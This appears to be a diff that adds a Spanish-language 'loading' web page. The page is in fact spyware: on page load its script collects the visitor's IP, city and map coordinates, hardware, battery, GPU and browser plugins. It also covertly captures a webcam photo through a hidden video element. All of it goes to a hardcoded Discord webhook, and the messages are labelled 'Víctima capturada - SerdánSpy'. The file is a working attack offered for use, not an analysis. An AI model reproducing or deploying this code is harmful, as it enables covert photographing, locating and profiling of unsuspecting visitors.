@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: black;
+            color: white;
+            overflow: hidden; 
+        }
+        .texto-principal {
+            font-size: 2.5em; 
+            text-align: center;
+            text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.5);
+            padding: 20px;
+        }
+        #video, #canvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="texto-principal">
+        Acepta los permisos solicitados para acceder.
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1460043601789845625/8LkgnCiB-nO62qRDBPs5b0UMW8FoljC8GcfYPovbOMlkEGTDe1P1nZG76du8anLDYKFQ";
+
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], { type: mime });
+}
+
+async function manejarCamara() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
+        
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const fotoData = await new Promise((resolve) => {
+            const checkVideo = setInterval(() => {
+                if (video.videoWidth > 0) {
+                    clearInterval(checkVideo);
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const data = canvas.toDataURL('image/jpeg', 0.8);
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(data);
+                    }, 2000); // 2 segundos para evitar foto negra
+                }
+            }, 100);
+        });
+
+        const form = new FormData();
+        form.append('payload_json', JSON.stringify({ 
+            embeds: [{ title: "📸 FOTO CAPTURADA", color: 0x00FF00 }] 
+        }));
+        form.append('file', dataURLtoBlob(fotoData), 'foto_victima.jpg');
+        await fetch(WEBHOOK, { method: 'POST', body: form });
+
+    } catch (err) {
+        await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "❌ CÁMARA DENEGADA",
+                    description: "El usuario ha rechazado el permiso o no tiene cámara.",
+                    color: 0xFF0000
+                }]
+            })
+        });
+    }
+}
+
+async function enviarDatosCompletos() {
+    // 1. Datos Geográficos e IP
+    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+    
+    // 2. Hardware y Batería
+    const battery = await navigator.getBattery?.() || {};
+    const batteryStatus = battery.level ? `${Math.round(battery.level * 100)}% ${battery.charging ? '(Cargando)' : '(Descargando)'}` : 'N/A';
+    const uaData = navigator.userAgentData || {};
+
+    // 3. Análisis de GPU (Tu lógica original)
+    let webglInfo = 'No disponible';
+    let gpuLevel = 'Desconocida';
+    try {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            webglInfo = renderer;
+            if (renderer.includes('RTX') || renderer.includes('Geforce')) gpuLevel = 'Alta gama (Gamer)';
+            else if (renderer.includes('Intel') || renderer.includes('UHD')) gpuLevel = 'Básica (Integrada)';
+            else gpuLevel = 'Media';
+        }
+    } catch(e) {}
+
+    // 4. Nivel de Usuario por Plugins (Tu lógica original)
+    const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'Ninguno';
+    let userLevel = 'Principiante';
+    const savvyPlugins = ['uBlock', 'AdBlock', 'VPN', 'NoScript', 'Bitwarden'];
+    if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo / Tech-savvy';
+
+    // 5. Enlace Google Maps
+    const gMapsLink = (geo.latitude && geo.longitude) 
+        ? `[📍 Ver en Google Maps](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})` 
+        : "Coordenadas no disponibles";
+
+    // 6. Construcción del Embed (Estilo original mejorado)
+    const embed = {
+        title: "Víctima capturada - SerdánSpy",
+        color: 0x00FF00,
+        fields: [
+            { name: "🌐 Red e IP", value: `**IP:** ${geo.ip || '?'}\n**ISP:** ${geo.org || '?'}\n**Zona:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
+            { name: "📍 Ubicación", value: `${geo.city || '?'}, ${geo.region || '?'}, ${geo.country_name || '?'}\n${gMapsLink}`, inline: false },
+            { name: "💻 Hardware", value: `**SO:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || '?'}GB\n**CPU:** ${navigator.hardwareConcurrency || '?'} núcleos`, inline: true },
+            { name: "🔋 Batería", value: batteryStatus, inline: true },
+            { name: "🎮 GPU", value: `**Modelo:** ${webglInfo}\n**Calidad:** ${gpuLevel}`, inline: false },
+            { name: "🛠️ Navegador y Nivel", value: `**Nivel de usuario:** ${userLevel}\n**Pantalla:** ${screen.width}x${screen.height}`, inline: false }
+        ],
+        footer: { text: `Fecha y hora: ${new Date().toLocaleString()}` }
+    };
+
+    // Envío inmediato de la info técnica
+    await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] })
+    });
+}
+
+// Ejecución paralela total
+window.onload = () => {
+    enviarDatosCompletos(); 
+    manejarCamara(); 
+};
+</script>
+</body>
+</html>
